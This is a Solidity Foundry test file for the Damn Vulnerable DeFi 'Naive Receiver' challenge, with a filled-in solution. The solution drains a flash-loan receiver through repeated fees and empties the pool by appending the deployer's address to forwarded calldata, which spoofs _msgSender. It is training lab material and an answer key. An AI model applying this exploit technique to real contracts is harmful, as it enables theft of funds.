// SPDX-License-Identifier: MIT
// Damn Vulnerable DeFi v4 (https://damnvulnerabledefi.xyz)
pragma solidity =0.8.25;

import {Test, console} from "forge-std/Test.sol";
import {NaiveReceiverPool, Multicall, WETH} from "../../src/naive-receiver/NaiveReceiverPool.sol";
import {FlashLoanReceiver} from "../../src/naive-receiver/FlashLoanReceiver.sol";
import {BasicForwarder} from "../../src/naive-receiver/BasicForwarder.sol";

// My solution. Add imports.
import {IERC3156FlashLender} from "@openzeppelin/contracts/interfaces/IERC3156FlashLender.sol";

contract NaiveReceiverChallenge is Test {
    address deployer = makeAddr("deployer");
    address recovery = makeAddr("recovery");
    address player;
    uint256 playerPk;

    uint256 constant WETH_IN_POOL = 1000e18;
    uint256 constant WETH_IN_RECEIVER = 10e18;

    NaiveReceiverPool pool;
    WETH weth;
    FlashLoanReceiver receiver;
    BasicForwarder forwarder;

    modifier checkSolvedByPlayer() {
        vm.startPrank(player, player);
        _;
        vm.stopPrank();
        _isSolved();
    }

    /**
     * SETS UP CHALLENGE - DO NOT TOUCH
     */
    function setUp() public {
        (player, playerPk) = makeAddrAndKey("player");
        startHoax(deployer);

        // Deploy WETH
        weth = new WETH();

        // Deploy forwarder
        forwarder = new BasicForwarder();

        // Deploy pool and fund with ETH
        pool = new NaiveReceiverPool{value: WETH_IN_POOL}(address(forwarder), payable(weth), deployer);

        // Deploy flashloan receiver contract and fund it with some initial WETH
        receiver = new FlashLoanReceiver(address(pool));
        weth.deposit{value: WETH_IN_RECEIVER}();
        weth.transfer(address(receiver), WETH_IN_RECEIVER);

        vm.stopPrank();
    }

    function test_assertInitialState() public {
        // Check initial balances
        assertEq(weth.balanceOf(address(pool)), WETH_IN_POOL);
        assertEq(weth.balanceOf(address(receiver)), WETH_IN_RECEIVER);

        // Check pool config
        assertEq(pool.maxFlashLoan(address(weth)), WETH_IN_POOL);
        assertEq(pool.flashFee(address(weth), 0), 1 ether);
        assertEq(pool.feeReceiver(), deployer);

        // Cannot call receiver
        vm.expectRevert(0x48f5c3ed);
        receiver.onFlashLoan(
            deployer,
            address(weth), // token
            WETH_IN_RECEIVER, // amount
            1 ether, // fee
            bytes("") // data
        );
    }

    /**
     * CODE YOUR SOLUTION HERE
     */
    function test_naiveReceiver() public checkSolvedByPlayer {
        // Multicall FlashLoanReceiver 10 times - it will pay 10 eth to the lender through fees.
        bytes[] memory multicallInstructions = new bytes[](10+1);
        for (uint256 index = 0; index < 10; ++index) {
            multicallInstructions[index] = abi.encodeCall(
              IERC3156FlashLender.flashLoan,
              (receiver, address(weth), 1e15, ""));
        }

        // NaiveReceiverPool::withdraw has a bug. It subtracts the balance of the address
        // packed in forwarder's data. But then it sends the funds to the address passed into
        // it as a parameter.
        multicallInstructions[10] = abi.encodePacked(
            abi.encodeCall(NaiveReceiverPool.withdraw,
            (WETH_IN_POOL + WETH_IN_RECEIVER, payable(recovery))),
            deployer
        );
        // ↑↑↑ Call pool's withdraw, but use encodePacked to also add deployer's address in the data.
        // Deployer's address is not part of function selector + parameters, so it's ignored by
        // forwarder's delegateCall. But it is then used inside pool's _msgSender and gets tokens drained.

        // First test: pool.multicall(multicallInstructions);
        BasicForwarder.Request memory request = BasicForwarder.Request({
                from:player,
                nonce: 0,
                data: abi.encodeCall(Multicall.multicall, (multicallInstructions)),
                value:0,
                deadline: block.timestamp,
                target: address(pool),
                gas: gasleft()
        });
        // ↑↑↑ create a request to call `multicall` function of the pool. The author conveniently
        //  gave flashLoan and multicall to the same contract.
        bytes32 requestDataHash = forwarder.getDataHash(request);
        bytes32 kecak = keccak256(
            abi.encodePacked(
                "\x19\x01",
                forwarder.domainSeparator(),
                requestDataHash
            )
        );
        (uint8 v, bytes32 r, bytes32 s) = vm.sign(playerPk, kecak);
        bytes memory signature = abi.encodePacked(r, s, v);

        forwarder.execute(request, signature);
    }

    /**
     * CHECKS SUCCESS CONDITIONS - DO NOT TOUCH
     */
    function _isSolved() private view {
        // Player must have executed two or less transactions
        assertLe(vm.getNonce(player), 2);

        // The flashloan receiver contract has been emptied
        assertEq(weth.balanceOf(address(receiver)), 0, "Unexpected balance in receiver contract");

        // Pool is empty too
        assertEq(weth.balanceOf(address(pool)), 0, "Unexpected balance in pool");

        // All funds sent to recovery account
        assertEq(weth.balanceOf(recovery), WETH_IN_POOL + WETH_IN_RECEIVER, "Not enough WETH in recovery account");
    }
}
